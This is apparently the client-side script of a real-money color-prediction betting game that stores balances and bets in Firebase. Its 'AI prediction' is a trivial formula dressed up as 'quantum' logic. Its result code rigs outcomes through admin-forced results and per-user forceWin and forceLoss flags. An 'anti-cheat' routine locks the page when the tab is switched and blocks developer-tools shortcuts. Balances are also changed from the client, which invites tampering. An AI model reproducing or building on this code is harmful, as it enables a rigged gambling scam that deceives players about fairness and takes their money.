<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set, get, update, onValue, increment, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

    const firebaseConfig = {
        apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg",
        authDomain: "test-eb5e7.firebaseapp.com",
        databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com",
        projectId: "test-eb5e7",
        appId: "1:366282855653:web:dca7e000f5a22fb11f300c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const auth = getAuth(app);

    let uid = "", balance = 0, selection = null, gameTime = 30, currentMatch = "", hasBet = false;

    // --- ANTI-CHEAT SHIELD (Unhurt) ---
    const activateShield = () => {
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                document.body.innerHTML = "<div style='background:#0f172a;height:100vh;color:white;text-align:center;padding:50px;'><h1>üõ°Ô∏è SECURITY LOCK</h1><p>Predictor switching detected. Reload to continue.</p></div>";
            }
        });
        document.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
    };
    activateShield();

    // --- QUANTUM MATH LOGIC ---
    function quantumLogic(period) {
        if(!period) return 'RED';
        const seed = parseInt(period.toString().slice(-4)) || 0;
        const hour = new Date().getHours();
        const calculation = ((seed * 7) + (hour * 3)) % 10;
        return (calculation % 2 === 0) ? 'GREEN' : 'RED';
    }

    onAuthStateChanged(auth, u => {
        if(u) {
            uid = u.uid;
            onValue(ref(db, `users/${uid}`), s => {
                if(s.exists()){
                    const data = s.val();
                    balance = data.balance || 0;
                    const balDisp = document.getElementById("balDisplay");
                    if(balDisp) balDisp.innerText = balance.toFixed(2);
                    
                    // Ban Check
                    if(data.isBanned) {
                        document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:100px;'>YOUR ACCOUNT IS BANNED</h1>";
                    }
                }
            });
            loadHistory();
            initChart();
        }
    });

    // --- MAIN GAME TIMER ---
    setInterval(async () => {
        const now = Math.floor(Date.now() / 1000);
        const rem = gameTime - (now % gameTime);
        const matchId = new Date().toISOString().slice(0,10).replace(/-/g,'') + Math.floor(now/gameTime);
        
        if(currentMatch !== matchId) {
            currentMatch = matchId;
            const pId = document.getElementById("periodId");
            if(pId) pId.innerText = currentMatch;
            hasBet = false;
            const betBtn = document.getElementById("placeBet");
            if(betBtn) {
                betBtn.innerText = "CONFIRM STAKE";
                betBtn.disabled = false;
            }
        }

        const timerDisp = document.getElementById("timer");
        if(timerDisp) timerDisp.innerText = `00:${rem < 10 ? '0'+rem : rem}`;
        
        if(rem > 5) {
            const pred = quantumLogic(currentMatch);
            const aiDisp = document.getElementById("aiColor");
            if(aiDisp) {
                aiDisp.innerText = pred;
                aiDisp.style.color = pred === 'RED' ? '#ef4444' : '#10b981';
            }
        } else {
            const aiDisp = document.getElementById("aiColor");
            if(aiDisp) aiDisp.innerText = "WAITING...";
            const betBtn = document.getElementById("placeBet");
            if(betBtn) betBtn.disabled = true;
            
            if(rem === 1) {
                setTimeout(() => processResult(), 800);
            }
        }
    }, 1000);

    window.pick = (val, btn) => {
        selection = val;
        document.querySelectorAll('.c-btn').forEach(b => b.classList.remove('selected'));
        btn.classList.add('selected');
    };

    window.confirmStake = async () => {
        const amtInput = document.getElementById("amtInput");
        const amt = parseInt(amtInput.value);
        if(!selection) return alert("Please select Red or Green!");
        if(amt < 10) return alert("Minimum bet ‚Çπ10");
        if(amt > balance) return alert("Insufficient Balance!");
        if(hasBet) return alert("Bet already placed!");

        try {
            await update(ref(db, `users/${uid}`), { balance: increment(-amt) });
            await set(ref(db, `bets_${gameTime}/${currentMatch}/${uid}`), { 
                color: selection, 
                amount: amt,
                email: auth.currentUser.email 
            });
            hasBet = true;
            const betBtn = document.getElementById("placeBet");
            betBtn.innerText = "STAKED ‚úì";
            betBtn.disabled = true;
        } catch (e) { alert("Error: " + e.message); }
    };

    async function processResult() {
        try {
            // 1. Check if Admin forced a global result
            const resRef = ref(db, `results_${gameTime}/${currentMatch}`);
            const resSnap = await get(resRef);
            
            // 2. Check if this specific User is Rigged (Force Win/Loss)
            const userRef = ref(db, `users/${uid}`);
            const userSnap = await get(userRef);
            const userData = userSnap.val();

            let finalColor = "";

            if(resSnap.exists()) {
                finalColor = resSnap.val().color;
            } else {
                finalColor = quantumLogic(currentMatch);
                
                // --- RIGGING LOGIC SYNC ---
                if(userData.forceWin && hasBet) {
                    finalColor = selection; // Use user's pick
                } else if(userData.forceLoss && hasBet) {
                    finalColor = (selection === 'RED' ? 'GREEN' : 'RED'); // Force opposite
                }

                await set(resRef, { color: finalColor, timestamp: Date.now() });
            }

            if(hasBet) checkWinLoss(finalColor);
        } catch (e) { console.error("Result Error:", e); }
    }

    async function checkWinLoss(resColor) {
        const myBetSnap = await get(ref(db, `bets_${gameTime}/${currentMatch}/${uid}`));
        if(!myBetSnap.exists()) return;
        
        const b = myBetSnap.val();
        const win = b.color === resColor;
        const winAmt = win ? b.amount * 1.92 : 0;

        if(win) {
            await update(ref(db, `users/${uid}`), { 
                balance: increment(winAmt),
                totalWin: increment(winAmt)
            });
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
        } else {
            await update(ref(db, `users/${uid}`), { totalLoss: increment(b.amount) });
        }

        const status = document.getElementById("resStatus");
        const icon = document.getElementById("resIcon");
        const val = document.getElementById("resValue");
        const overlay = document.getElementById("resOverlay");

        if(status) {
            status.innerText = win ? "WINNER!" : "LOST";
            status.style.color = win ? "#10b981" : "#ef4444";
            icon.innerText = win ? "üèÜ" : "‚ùå";
            val.innerText = win ? "+‚Çπ" + winAmt.toFixed(2) : "-‚Çπ" + b.amount;
            overlay.style.display = "flex";
        }
        
        hasBet = false;
        loadHistory();
    }

    window.closeOverlay = () => {
        const overlay = document.getElementById("resOverlay");
        if(overlay) overlay.style.display = "none";
    };

    function loadHistory() {
        const hRef = query(ref(db, `results_${gameTime}`), limitToLast(10));
        onValue(hRef, snap => {
            const list = document.getElementById("historyList");
            if(!list) return;
            list.innerHTML = "";
            snap.forEach(child => {
                const data = child.val();
                list.innerHTML = `
                <div class="history-row">
                    <span style="color:#64748b; font-weight:800;">#${child.key.slice(-4)}</span>
                    <span style="font-weight:900; color:${data.color==='RED'?'#ef4444':'#10b981'}">${data.color}</span>
                    <div class="res-dot" style="background:${data.color==='RED'?'#ef4444':'#10b981'}"></div>
                </div>` + list.innerHTML;
            });
        });
    }

    function initChart() {
        const chart = document.getElementById("trendChart");
        if(!chart) return;
        setInterval(() => {
            const bar = document.createElement("div");
            bar.className = "bar";
            bar.style.height = Math.random() * 80 + 20 + "%";
            bar.style.background = Math.random() > 0.5 ? '#10b981' : '#ef4444';
            chart.appendChild(bar);
            if(chart.children.length > 20) chart.removeChild(chart.children[0]);
        }, 2000);
    }
</script>
